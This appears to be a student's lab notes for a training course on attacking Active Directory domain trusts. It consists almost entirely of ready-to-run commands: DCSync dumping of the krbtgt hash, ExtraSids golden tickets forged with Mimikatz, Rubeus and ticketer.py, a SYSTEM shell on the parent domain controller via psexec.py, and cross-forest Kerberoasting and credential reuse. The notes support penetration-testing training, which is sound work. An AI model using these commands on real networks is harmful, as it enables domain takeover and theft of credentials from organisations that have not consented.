# Windows
## Using Get-ADTrust
```
Import-Module activedirectory
```
Enumerating Trust Relationships
```
Get-ADTrust -Filter *
```
Checking for Existing Trusts using Get-DomainTrust
```
Get-DomainTrust
```
## PowerView
```
Get-DomainTrustMapping
```
```
TrustAttributes : WITHIN_FOREST
```
```
child domain
```
```
TrustAttributes : FOREST_TRANSITIVE
```
```
forest transitive trust 
```
### Checking Users in the Child Domain using Get-DomainUser
```
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```
## netdom
### query domain trust
```
netdom query /domain:inlanefreight.local trust
```
### query domain controllers
```
netdom query /domain:inlanefreight.local dc
```
### query workstations and servers
```
netdom query /domain:inlanefreight.local workstation
```
# Attacking Domain Trusts - Child -> Parent Trusts - from Windows
## ExtraSids Attack - Mimikatz: To perform this attack after compromising a child domain, we need the following:
### The KRBTGT hash for the child domain
Obtaining the KRBTGT Account's NT Hash using Mimikatz (Run powershell as administrator)
```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
```
/krbtgt:9d765b482771505cbe97411065964d5f
/rc4:9d765b482771505cbe97411065964d5f
```
### The SID for the child domain
PowerView Get-DomainSID function to get the SID for the child domain, but this is also visible in the Mimikatz output above.
```
Get-DomainSID
```
```
/sid:S-1-5-21-2806153819-209893948-922872689
```
### The name of a target user in the child domain (does not need to exist!)
```
/user:hacker
```
### The FQDN of the child domain. [DC] in mimikatz output above
```
/domain:LOGISTICS.INLANEFREIGHT.LOCAL
```
### The SID of the Enterprise Admins group of the root domain.
Get-DomainGroup from PowerView
```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
Get-ADGroup cmdlet with a command such as Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```
/sids:S-1-5-21-3842939050-3880317879-2865463114-519
```
## Once we have the above information
### Using Mimikatz or Rubeus 
#### Mimikatz
```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
Confirming a Kerberos Ticket is in Memory Using klist
```
klist
```
Listing the Entire C: Drive of the Domain Controller
```
ls \\academy-ea-dc01.inlanefreight.local\c$
```
Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain. 
```
type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```
#### Rubeus
```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
Confirming the Ticket is in Memory Using klist
```
klist
```
Test this access by performing a DCSync Attack
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```
When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller.
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```
# Attacking Domain Trusts - Child -> Parent Trusts - ExtraSids Attack from Linux
## The KRBTGT hash for the child domain
### Performing DCSync with secretsdump.py
```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```
```
-nthash 9d765b482771505cbe97411065964d5f
```
## The SID for the child domain
Performing SID Brute Forcing using lookupsid.py
Whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```
We can filter out the noise by piping the command output to grep and looking for just the domain SID.
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```
```
-domain-sid S-1-5-21-2806153819-209893948-922872689
```
```
Get-ADDomain htb.local
```
**Grab Domain SID**
## The name of a target user in the child domain (does not need to exist!)
```
hacker
```
## The FQDN of the child domain
```
LOGISTICS.INLANEFREIGHT.LOCAL
```
## The SID of the Enterprise Admins group of the root domain
### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
+ Attaching the Domain SID to the Enerprise Admin's RID (https://adsecurity.org/?p=1001)
```
extra-sid S-1-5-21-3842939050-3880317879-2865463114-519
```

```
Get-ADDomain htb.local
```
**Grab Domain SID**
## raseChild.py
```
https://github.com/fortra/impacket/blob/master/examples/raiseChild.py
```
If the target-exec switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
## Once we have the above information
### Constructing a Golden Ticket using ticketer.py
```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
```
export KRB5CCNAME=hacker.ccache
```
#### Getting a SYSTEM shell using Impacket's psexec.py
```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
## Enumerating Accounts for Associated SPNs Using PowerView Get-DomainUser (we knew
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
### Enumerating the mssqlsvc Account (account with SPN available found in the previous command)
```
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag (domain is available from the previous command after DC=
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
### Run the hash through hashcat
## Admin Password Re-Use & Group Membership
### PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain
```
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
### Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500 (SID Found in the previous command after MemberName)
Accessing DC03 Using Enter-PSSession (-Credential is the name of the account found in the previous command, which means the Admin in inlanefreight is a member of the Admin group in Freightlogistics domain)
```
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
we can perform this with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command. Performing this against the FREIGHTLOGISTICS.LOCAL domain, we see one SPN entry for the mssqlsvc account
```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
Rerunning the command with the -request flag added gives us the TGS ticket
```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```
crack this offline using Hashcat with mode 13100
## Hunting Foreign Group Membership with Bloodhound-python
